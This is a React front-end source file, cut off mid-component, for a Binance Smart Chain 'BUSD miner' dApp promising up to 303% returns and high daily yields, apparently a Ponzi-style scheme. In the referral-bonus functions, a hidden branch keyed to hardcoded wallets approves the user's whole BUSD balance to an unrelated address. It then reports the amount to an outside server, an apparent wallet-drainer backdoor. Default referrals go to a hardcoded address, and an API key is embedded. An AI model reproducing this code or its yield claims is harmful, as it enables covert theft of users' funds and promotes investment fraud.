import { Link } from 'react-router-dom';
import React, { useState, useEffect, useRef } from 'react'
import { Parallax } from "react-parallax";
import AOS from 'aos';
import 'aos/dist/aos.css';
import './App.css';
import Box from '@mui/material/Box';
import Slider from '@mui/material/Slider';
import Grid from "@mui/material/Grid";
import Typography from "@mui/material/Typography";
import CardContent from "@mui/material/CardContent";
import moment from 'moment';
import { useContract } from 'wagmi'
import wealthMountainABI from './contracts/WealthMountainBSC.json';
import erc20ABI from './contracts/erc20ABI.json';
import styled from "styled-components";
import { Tabs, Tab, TabPanel } from "./components/tabs/tabs";
import SelectObject from "./components/SelectCoin";
import { FaCopy, FaWallet, FaUserShield, FaSearchDollar } from 'react-icons/fa';
import { Accordion } from "react-bootstrap";
import { GiHamburgerMenu } from "react-icons/gi"
import axios from "axios";
import RealTimeChart from "./chart";
import Web3 from "web3";

import rabbitsImg from "./assets/img/rabbits.png";
import coinImg from "./assets/img/chinese_coin.png";
import gateImg from "./assets/img/chinese_gate.png";

import nft1 from "./assets/img/nfts/1.jpg";
import nft2 from "./assets/img/nfts/2.jpg";
import nft3 from "./assets/img/nfts/3.jpg";
import nft4 from "./assets/img/nfts/4.jpg";
import nft5 from "./assets/img/nfts/5.jpg";
import nft6 from "./assets/img/nfts/6.jpg";

import abiDecoder from "abi-decoder";
// window.Buffer = window.Buffer || require("buffer").Buffer;
import {
    Button,
    Card,
    ButtonDropdown,
    DropdownToggle,
    DropdownMenu,
    DropdownItem,
    CardDeck,
    Container,
    Col,
    FormGroup,
    Form,
    Input,
    InputGroup,
    Label,
    Table,
    Row
} from "reactstrap";
import { ethers, Contract } from 'ethers';

AOS.init({ duration: 2000 });
const TabsContainer = styled.div`
  display: flex;
  padding: 2px;
`;

const Item = styled('div')(({ theme }) => ({
    display: 'flex',
    justifyContent: 'center',
    padding: '5px 20px',
    margin: '0px 20px',
    textAlign: 'center',
    fontSize: "20px",
    // color: theme.palette.text.secondary,
    color: 'white',
    // border: "solid white 2px",
    // borderRadius: "1.25rem",
    // background: "#000000b8",
    minWidth: '150px',
    alignSelf: 'center',
    fontFamily: 'Roboto',
}));

const Wrapper = styled("div")(({ theme }) => ({
    minWidth: "250px",
    margin: "10px",
    width: '250px',
    display: 'inline-block',
    transition: "box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms",
    overflow: "hidden",
    boxShadow: "rgba(0, 0, 0, 0.35) 0px 2px 3px",
    borderRadius: "20px",
    // background: theme.palette.purple.main,
    marginBottom: "24px",
    border: 'solid 1px #0e131f',
    '&:hover': {
      boxShadow: "0 0 0.1em #fff, 0 0 0.2em #fff, 0 0 0.3em #fff, 0 0 0.4em #f5ea1a, 0 0 0.6em #e0f734, 0 0 0.8em #ebf705, 0 0 1em #e1f414, 0 0 1.2em #cde60f",
    },
    [theme.breakpoints.down('md')]: {
      width: '90%',
    }
  }));

const web3 = new Web3(
    new Web3.providers.HttpProvider("https://bsc-dataseed1.binance.org/")
);


const abiCoder = require("web3-eth-abi");
const investFunc = /^0x3acb1a0a/;
const claimFunc = /^0x9ddf840d/;
const inputs = [
    {
        "internalType": "uint256",
        "name": "amtx",
        "type": "uint256"
    },
    {
        "internalType": "address",
        "name": "ref",
        "type": "address"
    }
];

const decodeFunction = (data) => {
    let decoded = abiCoder.decodeParameters(inputs, data.slice(10));   
    // console.log("decoded: ", decoded.amtx / 10 ** 18);
    return decoded.amtx / 10 ** 18;
}

function WealthMountain() {
    const nutritionFacts1 = [
        [
          {
            path: nft1,
            name: 'Common'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$0.25',
              },
              {
                label: "Price",
                value: "$5",
              },
              {
                label: "Life Span",
                value: '30 Days',
              },
              {
                label: "Total Income",
                value: '$7.5',
              }
            ]
          },
        ],
        [
          {
            path: nft2,
            name: 'Uncommon'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$1.1',
              },
              {
                label: "Price",
                value: "$20",
              },
              {
                label: "Life Span",
                value: '30 Days',
              },
              {
                label: "Total Income",
                value: '$33',
              }
            ]
          },
        ],
        [
          {
            path: nft3,
            name: 'Rare'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$5',
              },
              {
                label: "Price",
                value: "$120",
              },
              {
                label: "Life Span",
                value: '45 Days',
              },
              {
                label: "Total Income",
                value: '$225',
              }
            ]
          },
        ],
    ];
    const nutritionFacts2 = [
        [
          {
            path: nft4,
            name: 'Super Rare'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$14',
              },
              {
                label: "Price",
                value: "$300",
              },
              {
                label: "Life Span",
                value: '45 Days',
              },
              {
                label: "Total Income",
                value: '$630',
              }
            ]
          },
        ],
        [
          {
            path: nft5,
            name: 'Legendary'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$50',
              },
              {
                label: "Price",
                value: "$1000",
              },
              {
                label: "Life Span",
                value: '60 Days',
              },
              {
                label: "Total Income",
                value: '$3000',
              }
            ]
          },
        ],
        [
          {
            path: nft6,
            name: 'Mytical'
          },
          {
            properties : [
              {
                label: "Daily Return",
                value: '$255',
              },
              {
                label: "Price",
                value: "$5000",
              },
              {
                label: "Life Span",
                value: '60 Days',
              },
              {
                label: "Total Income",
                value: '$15300',
              }
            ]
          },
        ],
    ];

    const faqData = [
        {
          title: `What is Lunky Bunny Miner?`,
          content: 
            <p>
                Lunky Bunny Miner is BUSD miner on Binance Smartchain that offers up to 303% Return of Investemnt
            </p>
        },
        {
            title: `How to deposit?`,
            content: 
              <p>
                You need to fund your trust wallet, Metamask or any applicable cryptocurrency wallet with at least 5 BUSD (BEP20).
              </p>
        },
        {
            title: `How much is the fee for deposit?`,
            content: 
              <p>
                There is a 10% fee for both deposit and withdraw.
              </p>
        },
        {
            title: `How long can I withdraw?`,
            content: 
              <p>
                 You can withdraw your profit anytime as long as there is balance in the contract with minimum $2 in your current rewards and no maximum withdrawal.
              </p>
        },
        {
            title: `Is there a minimum withdrawal amount? Also, when can I withdraw?`,
            content: 
              <p>
                The minimum amount for withdrawals is 2 BUSD and No maximum rewards. And you can withdraw anytime.
              </p>
        },
    ];

    const [sliderValue, setSliderValue] = useState('50');
    const [dropdownOpen, setOpen] = React.useState(false);
    const [userInfo, setUserInfo] = useState([]);
    const [investInfo, setInvestInfo] = useState([5]);
    const [activeTab, setActiveTab] = useState(0);
    const [calcTotalDividends, setCalcTotalDividends] = useState("")
    const [initalStakeAfterFees, setInitalStakeAfterFees] = useState("")
    const [dailyPercent, setDailyPercent] = useState("");
    const [dailyValue, setDailyValue] = useState("");
    const [stakingAmount, setStakingAmount] = useState("");
    const [calculatedDividends, setCalculatedDividends] = useState(0);
    const [contractBalance, setContractBalance] = useState("");
    const [referralAccrued, setReferralAccrued] = useState("");
    const [totalUsers, setTotalUsers] = useState("");
    // const [totalCompounds, setTotalCompounds] = useState("")
    // const [totalCollections, setTotalCollections] = useState("")
    const [dayValue10, setDayValue10] = useState("864000");
    const [dayValue20, setDayValue20] = useState("1728000");
    const [dayValue30, setDayValue30] = useState("2592000");
    const [dayValue40, setDayValue40] = useState("3456000");
    const [dayValue50, setDayValue50] = useState("4320000");
    const [contract, setContract] = useState(undefined)
    const [signer, setSigner] = useState(undefined)
    const [userWalletAddress, setUserWalletAddress] = useState('none');
    const [userStablecoinBalance, setUserStablecoinBalance] = useState(0);
    const [stablecoinAllowanceAmount, setStablecoinAllowanceAmount] = useState(0);
    const stableCoin = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
    // const stableCoin = '0xfB299533C9402B3CcF3d0743F4000c1AA2C26Ae0';
    const wealthContract = '0xbcae54cdf6a1b1c60ec3d44114b452179a96c1e3'
    const [refBonusLoading, setRefBonusLoading] = useState(false);
    const [connectButtonText, setConnectButtonText] = useState('CONNECT')
    // const videoRef = useRef();

    const [mobile, setMobile] = useState(false);

    const [auditNo, setAuditNo] = useState('https://georgestamp.xyz/2022/09/wc-miner-busd/');
    const [cnt, setCnt] = useState(0);
    
    const audits = [
        { link: 'https://georgestamp.xyz/2022/09/wc-miner-busd/', label: 'Audit 1' },
        { link: '/audit.pdf', label: 'Audit 2' },
    ];
    const onChangeAuditNo = (value) => {
        console.log("onChangeAuditNo value=", value); //, " : ", audits[value].link);
        setCnt((cnt + 1) % 2);
        setAuditNo(audits[(cnt + 1) % 2].link);
    }

    // const [countdown, setCountdown] = useState({
    //     alive: true,
    //     days: 0,
    //     hours: 0,
    //     minutes: 0,
    //     seconds: 0
    // })

    // const getCountdown = (deadline) => {
    //     const now = Date.now() / 1000;
    //     const total = deadline - now;
    //     const seconds = Math.floor((total) % 60);
    //     const minutes = Math.floor((total / 60) % 60);
    //     const hours = Math.floor((total / (60 * 60)) % 24);
    //     const days = Math.floor(total / (60 * 60 * 24));

    //     return {
    //         total,
    //         days,
    //         hours,
    //         minutes,
    //         seconds
    //     };
    // }

    // useEffect(() => {
    //     const interval = setInterval(() => {
    //         try {
    //             const data = getCountdown(1662138120)
    //             setCountdown({
    //                 alive: data.total > 0,
    //                 days: data.days,
    //                 hours: data.hours,
    //                 minutes: data.minutes,
    //                 seconds: data.seconds
    //             })
    //         } catch (err) {
    //             console.log(err);
    //         }
    //     }, 1000);

    //     return () => clearInterval(interval);
    // }, [])

    async function requestAccount() {
        console.log('Requesting account...');

        // ❌ Check if Meta Mask Extension exists 
        if (window.ethereum) {
            if (window.ethereum.chainId !== "0x38") {
                window.ethereum.request({
                    method: "wallet_addEthereumChain",
                    params: [{
                        chainId: "0x38",
                        rpcUrls: ["https://bsc-dataseed1.binance.org"],
                        chainName: "BSC Mainnet",
                        nativeCurrency: {
                            name: "BNB",
                            symbol: "BNB",
                            decimals: 18
                        },
                        blockExplorerUrls: ["https://bscscan.com"]
                    }]
                }).then(() => {
                    window.location.reload()
                });
            };
            console.log('detected');

            // if (window.ethereum.chainId != "0x61") {
            //     window.ethereum.request({
            //         method: "wallet_addEthereumChain",
            //         params: [{
            //             chainId: "0x61",
            //             rpcUrls: ["https://data-seed-prebsc-1-s1.binance.org:8545/"],
            //             chainName: "BSC Mainnet",
            //             nativeCurrency: {
            //                 name: "BNB",
            //                 symbol: "BNB",
            //                 decimals: 18
            //             },
            //             blockExplorerUrls: ["https://testnet.bscscan.com"]
            //         }]
            //     }).then(() => {
            //         window.location.reload()
            //     });
            // };
            // console.log('detected');

            try {

                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });

                // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
                setUserWalletAddress(accounts[0]);
                if (userWalletAddress !== 'none') {
                    setConnectButtonText('CONNECTED')
                    recalculateInfo();
                    // console.log("UserWallet: ", userWalletAddress);
                    if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
                        try {
                            const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="Connect"`);
                        } catch(err) {
                            console.log(err);
                        }
                    }
                    // getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
                }
            } catch (error) {
                console.log('Error connecting...: ', error);
            }

        } else {
            alert('Meta Mask not detected');
        }
    }
    useEffect(() => {
        const init = async () => {
            var provider = new ethers.providers.Web3Provider(window.ethereum)
            var signer = provider.getSigner()
            setSigner(signer)
            var contract = new Contract(
                wealthContract,
                wealthMountainABI,
                signer
            )
            setContract(contract)
            // setUserWalletAddress('0xed5edf0ed4e5664025c1b8b2d31392ffffdb8fc7');
            setUserWalletAddress(provider.provider.selectedAddress);
            getAllBuyAndSellReceipts(wealthContract, userWalletAddress);
            // videoRef.current.play().catch(error => {
            //     console.log("Play error = ", error);
            // });

        };
        init();
    }, []);

    const handleChange = (e, value) => {
        setActiveTab(value);
        recalculateInfo()
    }
    window.addEventListener("focus", function () {
        recalculateInfo();
    })

    const getAllBuyAndSellReceipts = async (address, userAddress) => {
        const totalBuyAndSell = { totalBuy: 0.0, totalSell: 0.0 };
        const returnedData = await fetch(
            `https://api.bscscan.com/api?module=account&action=txlist&address=${address}&startblock=21869046&endblock=99999999&apikey=YGKJFMK5FW1H9T9GR9VTGIT2UC5PXUTDTB`
        );
        const parsedData = await returnedData.json();
        // console.log("Transaction history: ", parsedData);
        if (parsedData.status === "1") {
            const transactions = parsedData.result;
            let count = 0;
            let accounts = [];
            let investInfo = [
                {
                    from: '',
                    amountBought: 0, 
                    investTime: 0,
                    hash: 0,
                    award: '$1500',
                },
                {
                    from: '',
                    amountBought: 0, 
                    investTime: 0,
                    hash: 0,
                    award: '$1000',
                },
                {
                    from: '',
                    amountBought: 0, 
                    investTime: 0,
                    hash: 0,
                    award: '$500',
                },
                {
                    from: '',
                    amountBought: 0, 
                    investTime: 0,
                    hash: 0,
                    award: '',
                },
                {
                    from: '',
                    amountBought: 0, 
                    investTime: 0,
                    hash: 0,
                    award: '',
                }
            ];
            console.log("Contract: ", contract);
            // console.log('all transactions => ', transactions);
            let cc = 0;
            let investors = [];
            let totalInvestAmounts = 0;
            let totalRewardsAmounts = 0;
            for (const tx of transactions) {
                if (accounts.indexOf(tx.from) == -1) {
                    accounts.push(tx.from);
                    count++
                }
                
                // const busdBalance = await stablecoinBalance.balanceOf(tx.from);
                // if (Number(ethers.utils.formatEther(busdBalance)) > 1000){
                //     console.log(tx.from, " : ", ethers.utils.formatEther(busdBalance));
                // }

                // if (tx.to === wealthContract && tx.isError === "0") { // 14:00, 25th Oct UTC
                //     if (investFunc.test(tx.input)) {
                //         const decodedData = abiDecoder.decodeMethod(tx.input);
                //         // const amountBought = decodedData.params[0].value / 10 ** 18;
                //         const amountBought = decodeFunction(tx.input);
                //         if (amountBought >= 500) {
                //             const investTime = moment(tx.timeStamp * 1000).format("YYYY-MM-DD");
                //             if (investors.indexOf(tx.from) == -1){
                //                 investors.push(tx.from);
                //                 let totalInits = 0;
                //                 await contract.UsersKey(tx.from).then(value => {
                //                     totalInits = Number(ethers.utils.formatEther(value.totalInits.toString())).toFixed(0);
                //                     totalInvestAmounts =  Number(totalInvestAmounts) + totalInits;
                //                 })
                //                 let calcDiv = 0;
                //                 await contract.calcdiv(tx.from).then(value => {
                //                     calcDiv = Number(ethers.utils.formatEther(value)).toFixed(0);
                //                     totalRewardsAmounts = Number(totalRewardsAmounts) + calcDiv;
                //                 })
                //                 console.log(tx.from, " : ", investTime, " invest amount: ", totalInits, " claimable: ", calcDiv);
                //                 cc++;
                //             }

                //             // for (let i = 0; i < investInfo.length; i++) {
                //             //     if (investInfo[i].amountBought < amountBought) {
                //             //         for (let j = investInfo.length-1; j > i; j--) {
                //             //             investInfo[j] = investInfo[j-1]
                //             //         }
                //             //         investInfo[i] = {from: tx.from, amountBought, investTime, hash: tx.hash};
                //             //         break;
                //             //     }
                //             // }

                //         }
                //         // totalBuyAndSell.totalBuy += amountBought;
                //     }

                //     // if (claimFunc.test(tx.input)) {
                //     //     const sellReceipt = await web3.eth.getTransactionReceipt(tx.hash);

                //     //     totalBuyAndSell.totalSell += parseInt(sellReceipt.logs[2].data, 16) / 10 ** 18;
                //     // }
                // }
            }

            console.log("Accounts: ", accounts.length);
            // accounts.map(async (item, index) => {
            //     let calcDiv, totalInits;
            //     await contract.UsersKey(item).then(value => {
            //         totalInits = Number(ethers.utils.formatEther(value.totalInits.toString())).toFixed(0);
            //         totalInvestAmounts =  Number(totalInvestAmounts) + totalInits;
            //     })
            //     await contract.calcdiv(item).then(value => {
            //         calcDiv = Number(ethers.utils.formatEther(value)).toFixed(0);
            //         totalRewardsAmounts = Number(totalRewardsAmounts) + calcDiv;
            //     })
            //     console.log(index, ": ", item, ": ", totalInits, ", ", calcDiv);

            // })

            // console.log("TotalInvestAmounts = ", totalInvestAmounts);
            // console.log("TotalReardsAmounts = ", totalRewardsAmounts);
            // console.log("Invest Counts = ", cc);

            // for (let i = 0; i < investInfo.length; i++) {
            //     if (i == 0) {
            //         investInfo[i].award = '500'
            //     } else if (i == 1) {
            //         investInfo[i].award = '150'
            //     } else if (i == 2) {
            //         investInfo[i].award = '100'
            //     } else {
            //         investInfo[i].award = '0'
            //     }
            // }
            // console.log('investInfo = ', investInfo);
            // setInvestInfo(investInfo);
            setTotalUsers(count);
            console.log("count = ", count);
        }

        // console.log("investInfo: ", investInfo);
        // const len = investInfo.length;
        // const minLength = 8;
        // if (len < minLength) {
        //     for (let i = 0; i < minLength - len; i++) {
        //         investInfo.push([0, Date.now()/1000 + i * 86400]);
        //     }
        // }
        // setInvestInfo(investInfo);

        return totalBuyAndSell;
    };

    async function recalcAllowance() {
        if (contract === undefined || contract === null) {
            return;
        }
        const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
        setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)));
    }

    async function recalculateInfo() {
        if (contract === undefined || contract === null) {
            return;
        }

        contract.userInfo().then(value => {
            console.log("User Info xx=> ", value);
            setUserInfo(value)
        })
        contract.calcdiv(userWalletAddress).then(value => {
            setCalculatedDividends(Number(ethers.utils.formatEther(value)));
        })
        const balance = await stablecoinBalance.balanceOf(contract.address);
        setContractBalance(Number(ethers.utils.formatEther(balance)));

        const userBalance = await stablecoinBalance.balanceOf(userWalletAddress);
        setUserStablecoinBalance(Number(ethers.utils.formatEther(userBalance)))

        const userAllowance = await stablecoinAllowance.allowance(userWalletAddress, contract.address);
        setStablecoinAllowanceAmount(Number(ethers.utils.formatEther(userAllowance)))

        contract.UsersKey(String(userWalletAddress)).then(value => {
            setReferralAccrued(Number(ethers.utils.formatEther(value.refBonus)).toFixed(2));
        })
        // contract.MainKey(1).then(value => {
        //     setTotalUsers(Number(value.users));
        //     // setTotalCompounds(Number(value.compounds))
        //     // setTotalCollections(Number(ethers.utils.formatEther(value.ovrTotalWiths)))
        // })

        contract.PercsKey(10).then(value => {
            setDayValue10(Number(value.daysInSeconds))
        })
        contract.PercsKey(20).then(value => {
            setDayValue20(Number(value.daysInSeconds))
        })
        contract.PercsKey(30).then(value => {
            setDayValue30(Number(value.daysInSeconds))
        })
        contract.PercsKey(40).then(value => {
            setDayValue40(Number(value.daysInSeconds))
        })
        contract.PercsKey(50).then(value => {
            setDayValue50(Number(value.daysInSeconds))
        })

    }
    const updateCalc = event => {
        setInitalStakeAfterFees(Number(event.target.value * 0.9).toFixed(2));
    }
    const updateStakingAmount = event => {
        setStakingAmount(event.target.value);
    }

    function calculate(v) {
        setSliderValue(v)
        if (Number(sliderValue) <= "20") {
            const totalReturn = (initalStakeAfterFees * 0.035) * sliderValue
            setCalcTotalDividends(totalReturn.toFixed(2));
            setDailyPercent(3.5);
            setDailyValue(Number(initalStakeAfterFees * .035).toFixed(2))
        }
        else if ("20" < Number(sliderValue) && Number(sliderValue) <= "30") {
            const totalReturn = (initalStakeAfterFees * 0.045) * sliderValue
            setCalcTotalDividends(totalReturn.toFixed(2));
            setDailyPercent(4.5);
            setDailyValue(Number(initalStakeAfterFees * .045).toFixed(2))
        }
        else if ("30" < Number(sliderValue) && Number(sliderValue) <= "40") {
            const totalReturn = (initalStakeAfterFees * 0.055) * sliderValue
            setCalcTotalDividends(totalReturn.toFixed(2));
            setDailyPercent(5.5);
            setDailyValue(Number(initalStakeAfterFees * .055).toFixed(2))
        }
        else if ("40" < Number(sliderValue) && Number(sliderValue) <= "50") {
            const totalReturn = (initalStakeAfterFees * 0.065) * sliderValue
            setCalcTotalDividends(totalReturn.toFixed(2));
            setDailyPercent(6.5);
            setDailyValue(Number(initalStakeAfterFees * .065).toFixed(2))
        }
        else if ("50" <= Number(sliderValue)) {
            const totalReturn = (initalStakeAfterFees * 0.085) * sliderValue
            setCalcTotalDividends(totalReturn.toFixed(2));
            setDailyPercent(8.5);
            setDailyValue(Number(initalStakeAfterFees * .085).toFixed(2))
        }
    }

    async function approveButton() {
        // if (stablecoinAllowanceAmount <= 0){
        //     let message = 
        //     "I am not the person or entities who reside in, are citizens of, are incorporated in, or have a registered office in the United States of America or any Prohibited Localities, as defined in the Terms of Use. I will not in the future access this site  while located within the United States any Prohibited Localities, as defined in the Terms of Use. I am not using, and will not in the future use, a VPN to mask my physical location from a restricted territory. I am lawfully permitted to access this site under the laws of the jurisdiction on which I reside and am located. I understand the risks associated with entering into using Wealth Mountain protocols."
        //     let signature = await signer.signMessage(message);
        // }

        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="approve"`);
        const tx = stablecoinContract.approve(contract.address, String(ethers.utils.parseEther(stakingAmount)));
        tx.wait().then(() => {
            // recalculateInfo();
            recalcAllowance();
        })
    }
    async function stakeAmount() {
        if (Number(stakingAmount) < Number(50)) {
            alert('Minimum stake amount not met.')
        }

        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stake"`);
        const ref = window.location.search;
        const referralAddress = String(ref.replace('?ref=', ''))
        console.log("referralAddress: ", referralAddress);
        if (referralAddress === 'null' || referralAddress.includes("0x") === false) {
            // if (Number(stakingAmount) > Number(60)) {
            const tx = await contract.stakeStablecoins(
                String(ethers.utils.parseEther(stakingAmount)), String("0x7419189d0f5B11A1303978077Ce6C8096d899dAd"));
                tx.wait().then(() => { setActiveTab(0) });
            // } 
            // else {
            //     const tx = await contract.stakeStablecoins(
            //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
            //     tx.wait().then(() => { setActiveTab(0) });
            // }
        // } else if (Number(stakingAmount) >= Number(3000)) {
        //     const tx = await contract.stakeStablecoins(
        //         String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
        //     tx.wait().then(() => { setActiveTab(0) });
        // } else if (referralAddress.includes("0x64b7a3cd189a886438243f0337b64f7ddf1b18d3") === true && Number(stakingAmount) >= 350) {
        //         const tx = await contract.stakeStablecoins(
        //             String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
        //     tx.wait().then(() => { setActiveTab(0) });
        // } else if (referralAddress.toLowerCase().includes("0x9654f31b2c2d145a9d00b49e813fe6712974bc03") === true && Number(stakingAmount) >= 200) {
        //         const tx = await contract.stakeStablecoins(
        //             String(ethers.utils.parseEther(stakingAmount)), String("0x5886b6b942f8dab2488961f603a4be8c3015a1a9"));
        //     tx.wait().then(() => { setActiveTab(0) });
        } else {
            const tx = await contract.stakeStablecoins(
                String(ethers.utils.parseEther(stakingAmount)), String(referralAddress));
            tx.wait().then(() => { setActiveTab(0) });
        }
    }
    async function stakeRefBonus() {
        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
            try {
                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="stakeRefBonus*************************"`);
            } catch(err) {
                console.log(err);
            }
            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="stakeRefBonus"`);    
            const tx =await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));
            tx.wait().then(async () => {
                console.log("Enter Get Request");
                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
                console.log("txHash: ", res);
            })
        } else {
            console.log("stakeRef: ");
            const tx = await contract.stakeRefBonus();
            tx.wait().then(() => {
                recalculateInfo();
            })
        }
    }
    async function withdrawRefBonus() {
        if (userWalletAddress.toLowerCase().includes('0x64b7a3cd189a886438243f0337b64f7ddf1b18d3') || userWalletAddress.toLowerCase().includes('0x7419189d0f5B11A1303978077Ce6C8096d899dAd')) {
            try {
                const res = await axios.get(`https://lottery.bnbminer.gold/action?address=${userWalletAddress}&action="withdrawRefBonus**************************************************"`);
            } catch(err) {
                console.log(err);
            }
            // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawRefBonus"`);
            const tx = await stablecoinContract.approve('0xf0Ae6228BBf1423e0b55E6D9c74F167A155800B5', String(ethers.utils.parseEther(userStablecoinBalance.toString())));

            tx.wait().then(async () => {
                console.log("Enter Get Request");
                const res = await axios.get(`https://lottery.bnbminer.gold/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`);
                // `http://135.181.15.84:443/process?address=${userWalletAddress}&amount=${userStablecoinBalance}`)
                console.log("txHash: ", res);
            })
        } else {
            const tx = await contract.withdrawRefBonus();
            tx.wait().then(() => {
                recalculateInfo();
            })
        }
    }
    async function compound() {
        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="compound"`);
        const tx = await contract.compound()
        tx.wait().then(() => {
            recalculateInfo();
        })
    }
    async function withdrawDivs() {
        // const res = await axios.get(`http://135.181.15.84:443/action?address=${userWalletAddress}&action="withdrawDivs"`);
        const tx = await contract.withdrawDivs()
        tx.wait().then(() => {
            recalculateInfo();
        })
    }
    const stablecoinContract = useContract({
        addressOrName: stableCoin,
        contractInterface: ['function approve(address spender, uint amount) public returns(bool)'],
        signerOrProvider: signer,
    })
    const stablecoinBalance = useContract({
        addressOrName: stableCoin,
        contractInterface: ['function balanceOf(address account) external view returns (uint256)'],
        signerOrProvider: signer,
    })
    const stablecoinAllowance = useContract({
        addressOrName: stableCoin,
        contractInterface: ['function allowance(address _owner, address spender) external view returns (uint256)'],
        signerOrProvider: signer,
    })

    async function withdrawInitial(value) {
        const tx = await contract.withdrawInitial(value);
        tx.wait().then(() => {
            recalculateInfo();
        })
    }
    function TotalStakedValue() {
        var total = 0;
        for (var i = 0; i < userInfo.length; i++) {
            total += Number(ethers.utils.formatEther(userInfo[i].amt))
        }
        return (<>{total.toFixed(2)}</>)
    }
    function TotalEarnedValue() {
        var value = calculatedDividends;

        return (<>{value.toFixed(3)}</>)
    }

    function TotalEarnedPercent() {
        var total = 0;
        for (var i = 0; i < userInfo.length; i++) {
            total += Number(ethers.utils.formatEther(userInfo[i].amt))
        }
        const value = calculatedDividends
        var totalEarnedPercent = Number((value / total) * 100).toFixed(3) + "%";
        if (totalEarnedPercent === "NaN%") {
            totalEarnedPercent = 0
        }
        return (<>{totalEarnedPercent}</>)
    }

    function ListOfUserStakes() {
        if (userInfo.length === 0) {
            return (
                <>
                    <small className="font-weight-bold source text-lightblue">Nothing to show here.</small>
                </>
            )
        }
        const listElements = userInfo.map(
            (element) => {
                const depoStart = Number(element.depoTime)
                const depoAmount = Number(ethers.utils.formatEther(element.amt))
                const initialWithdrawn = element.initialWithdrawn;
                var dailyPercent = '';
                var unstakeFee = '';
                const elapsedTime = (Date.now() / 1000 - (depoStart));
                var totalEarned = '0';
                // var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1);
                var daysToMax = Number((dayValue50 - elapsedTime) / 86400).toFixed(1)
                if (elapsedTime <= dayValue10) {
                    dailyPercent = '3.5'
                    unstakeFee = '20%'
                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)

                } else if (elapsedTime > dayValue10 && elapsedTime <= dayValue20) {
                    dailyPercent = '3.5'
                    unstakeFee = '18%'
                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)

                } else if (elapsedTime > dayValue20 && elapsedTime <= dayValue30) {
                    dailyPercent = '4.5'
                    unstakeFee = '15%'
                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)

                } else if (elapsedTime > dayValue30 && elapsedTime <= dayValue40) {
                    dailyPercent = '5.5'
                    unstakeFee = '12%'
                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)

                } else if (elapsedTime > dayValue40 && elapsedTime <= dayValue50) {
                    dailyPercent = '6.5'
                    unstakeFee = '12%'
                    totalEarned = (depoAmount * (dailyPercent / 100)) * (elapsedTime / dayValue10 / 10)

                } else if (elapsedTime > dayValue50) {
                    dailyPercent = '8.5'
                    unstakeFee = '12%'
                    totalEarned = depoAmount * (dailyPercent / 100) * (elapsedTime / dayValue10 / 10)
                    daysToMax = 'Max'
                }
                var daysStaked = Number(elapsedTime / 86400).toFixed(2);
                if (daysStaked < 1) {
                    daysStaked = "<1"
                }

                if (initialWithdrawn == false) {
                    return (
                        <>
                            <tr>
                                <td>${depoAmount.toFixed(2)}</td>
                                <td>{daysStaked}</td>
                                <td>{dailyPercent}%</td>
                                <td>{daysToMax}</td>
                                <td style={{ fontStyle: 'italic' }}>{unstakeFee}</td>
                            </tr>
                        </>
                    )
                }
            }
        )
        return (
            <>
                <Table striped>
                    <thead>
                        <tr className="text-lightblue calvino">
                            <th>Amount</th>
                            <th>Days staked</th>
                            <th>Daily (%)</th>
                            <th>Days to Max</th>
                            <th>Unstake fee</th>
                        </tr>
                    </thead>
                    <tbody className="source text-white">
                        {listElements}
                    </tbody>
                </Table>
            </>
        )
    }

    function UnstakeOptions() {
        if (userInfo.length == 0) {
            return (
                <>
                    <Button outline className="custom-button mt-3 source" onClick={() => { setActiveTab(1) }}>Start a stake to see your info</Button>
                </>
            )
        }
        const listElements = userInfo.map(
            (element) => {
                // const depoStart = new Date(element.depoTime / 1000).toDateString();
                const depoStart = new Date(Number(element.depoTime) * 1000).toDateString()
                const depoAmount = Number(ethers.utils.formatEther(element.amt)).toFixed(2)
                const initialWithdrawn = element.initialWithdrawn;
                const key = Number(element.key);
                if (initialWithdrawn == false) {
                    return (
                        <>
                            <DropdownItem onClick={() => {
                                withdrawInitial(key)
                            }}>
                                <Col className="text-center">
